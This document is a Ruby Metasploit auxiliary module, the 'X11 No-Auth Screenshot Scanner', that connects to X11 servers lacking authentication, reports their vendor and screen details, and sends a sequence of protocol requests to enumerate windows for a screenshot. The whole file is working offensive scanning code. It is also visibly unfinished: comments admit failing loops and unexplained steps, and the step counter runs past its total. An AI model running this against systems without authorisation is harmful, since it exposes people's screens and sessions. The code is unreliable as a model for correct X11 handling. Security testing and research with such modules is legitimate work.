##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Exploit::Remote::Tcp
  include Auxiliary::Scanner
  include Auxiliary::Report
  include Exploit::Remote::X11

  def initialize
    super(
      'Name'	=> 'X11 No-Auth Screenshot Scanner',
      'Description'	=> %q{
        This module scans for X11 servers that allow anyone
        to connect without authentication. It can optionally take
        a screenshot as well.
      },
      'Author'	=> [
        'tebo <tebodell[at]gmail.com>', # original module
        'h00die' # X11 library, screenshot updates
      ],
      'References' => [
        ['OSVDB', '309'],
        ['CVE', '1999-0526'],
      ],
      'License'	=> MSF_LICENSE,
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [],
        'Reliability' => [],
        'RelatedModules' => [
          'auxiliary/gather/x11_keyboard_spy',
        ]
      }
    )

    register_options([
      Opt::RPORT(6000),
    ])
  end

  def process_extension_query(packet, extension)
    begin
      extension_response = QUERYEXTENSIONRESPONSE.read(packet)
    rescue ::EOFError
      packet += sock
      fail_with(Msf::Module::Failure::UnexpectedReply, "Unable to process QueryExtension Response. Raw packet: #{packet}")
    end

    if extension_response.present == 1
      print_good("  Extension #{extension} is present with id #{extension_response.major_opcode}")
    else
      fail_with(Msf::Module::Failure::UnexpectedReply, "Extension #{extension} is NOT present (#{packet.inspect})")
    end
    extension_response
  end

  def take_screenshot(connection)
    query_extension_calls = 0

    # query extension big-requests
    vprint_status('(2/9) Checking on BIG-REQUESTS extension')
    sock.put(QUERYEXTENSION.new(extension: 'BIG-REQUESTS', unused2: query_extension_calls).to_binary_s) # check if BIG-REQUESTS exist, not sure why
    query_extension_calls += 1
    big_requests_plugin = process_extension_query(sock.get_once(-1, 1), 'BIG-REQUESTS')

    # enable big requests
    vprint_status('(3/9) Enabling BIG-REQUESTS')
    sock.put(EXTENSIONTOGGLE.new(opcode: big_requests_plugin.major_opcode).to_binary_s) # not sure why we do this
    sock.get_once(-1, 1)

    # createGC, GetProperties
    vprint_status('(4/9) Creating new graphical context')
    sock.put(X11CREATEGRAPHICALCONTEXTREQUEST.new(cid: connection.resource_id_base,
                                                  drawable: connection.screen_root,
                                                  gc_value_mask_background: 1).to_binary_s +
             X11GETPROPERTYREQUEST.new(window: connection.screen_root).to_binary_s) # not sure why we do this
    sock.get_once(-1, 1)

    # query extension xkeyboard
    vprint_status('(5/9) Checking on XKEYBOARD extension')
    sock.put(QUERYEXTENSION.new(extension: 'XKEYBOARD', unused2: query_extension_calls).to_binary_s) # check if XKEYBOARD exist, not sure why
    xkeyboard_plugin = process_extension_query(sock.get_once(-1, 1), 'XKEYBOARD')
    query_extension_calls += 1

    # enable xkeyboard
    vprint_status('(6/9) Enabling XKEYBOARD')
    sock.put(EXTENSIONTOGGLE.new(opcode: xkeyboard_plugin.major_opcode, wanted_major: 1).to_binary_s) # use keyboard
    sock.get_once(-1, 1)

    # InternAtom wait
    vprint_status('(7/9) Setting wait on itern atom')
    sock.put(X11INTERNATOMREQUEST.new(name_value: 'Wait').to_binary_s)
    sock.get_once(-1, 1)

    # xkeyboard-bell
    vprint_status('(8/9) Setting xkeyboard bell')
    sock.put(BELLREQUEST.new(xkeyboard_id: xkeyboard_plugin.major_opcode).to_binary_s)
    # sock.get_once(-1, 1)

    # getwindowattributes+getgeometry
    # XXX this is getting a response of "Unkonwn request"
    query_extension_calls += 1 # XXX not sure why, figure out where we're missing a call
    vprint_status('(9/9) Getting root Window Attributes')
    sock.put(GETREQUEST.new(window: connection.screen_root,
                            opcode: 3, # GetWindowAttributes
                            unused: query_extension_calls).to_binary_s +
            GETREQUEST.new(
              window: 1320,
              opcode: 14, # GetGeometry
              unused: query_extension_calls + 1
            ).to_binary_s) # not sure why we do this
    sock.get_once(-1, 1)
    query_extension_calls += 2

    # translatecoordinates
    vprint_status('(10/9) Getting coordinates translation')
    sock.put(TRANSLATECOORDINATESREQUEST.new(src_window: connection.screen_root, dst_window: connection.screen_root).to_binary_s)
    sock.get_once(-1, 1)

    # getproperty
    vprint_status('(11/9) ')
    sock.put(X11GETPROPERTYREQUEST.new(window: connection.screen_root).to_binary_s)
    sock.get_once(-1, 1)

    # InternAtom server_overlay_visuals
    vprint_status('(12/9) Setting Server Overlay Visuals on Itern Atom')
    sock.put(X11INTERNATOMREQUEST.new(name_value: "SERVER_OVERLAY_VISUALS\x00\x00",
                                      only_if_exists: 1).to_binary_s)
    sock.get_once(-1, 1)

    # getwindowattributes+getgeometry
    vprint_status('(13/9) Getting window attributes and geometry')
    sock.put(GETREQUEST.new(window: connection.screen_root,
                            opcode: 3,
                            unused: 3).to_binary_s +
              GETREQUEST.new(opcode: 14,
                             window: connection.screen_root).to_binary_s)

    # querytree
    vprint_status('(14/9) Getting Tree')
    sock.put(QUERYTREEREQUEST.new(drawable: connection.screen_root).to_binary_s)
    # XXX typically in 2 packets
    data = sock.get_once(-1, 1)
    begin
      data << sock.get_once(-1, 1)
    rescue StandardError => e
      puts e.inspect
    end
    trees = QUERYTREERESPONSE.read(data)
    vprint_status("  Found #{trees.tree.length} trees")

    # getwindowattributes+getgeometry
    vprint_status('(15/9) Getting window attributes and geometry for each tree')
    puts trees.inspect
    trees.tree.each do |t|
      # XXX this loop is failing hard.
      next if t == 0

      # getwindowattributes+getgeometry
      sock.put(GETREQUEST.new(window: t,
                              opcode: 3,
                              unused: 3).to_binary_s +
              GETREQUEST.new(opcode: 14, window: t).to_binary_s)
      sock.get_once(-1, 1) # this has both responses in it, so we need to split it to process it correctly
    end
  end

  def run_host(ip)
    vprint_status('Establishing TCP Connection')
    connect # tcp connection establish
    vprint_status('(1/9) Establishing X11 connection')
    sock.put(X11CONNECTIONREQUEST.new.to_binary_s) # x11 session establish
    packet = sock.get_once(-1, 1)
    begin
      connection = X11CONNECTION.read(packet)
    rescue EOFError
      vprint_bad("Connection packet malfored (size: #{packet.length}), attempting to get read more data")
      packet += sock.get_once(-1, 1)
    end

    begin
      connection = X11CONNECTION.read(packet)
      if connection.success == 1
        print_good("#{ip} - Successly established X11 connection")
        vprint_status("  Vendor: #{connection.vendor}")
        vprint_status("  Version: #{connection.protocol_version_major}.#{connection.protocol_version_minor}")
        vprint_status("  Screen Resolution: #{connection.screen_width_in_pixels}x#{connection.screen_height_in_pixels}")
        vprint_status("  Resource ID: #{connection.resource_id_base.inspect}")
        vprint_status("  Screen root: #{connection.screen_root.inspect}")
        report_note(
          host: ip,
          proto: 'tcp',
          sname: 'x11',
          port: rport,
          type: 'x11.server_vendor',
          data: "Open X Server (#{connection.vendor})"
        )

        take_screenshot(connection)
      else
        vprint_error("#{ip} Access Denied")
      end
    rescue StandardError
      vprint_bad('Failed to parse X11 connection initialization response packet')
    end

    disconnect
  end
end
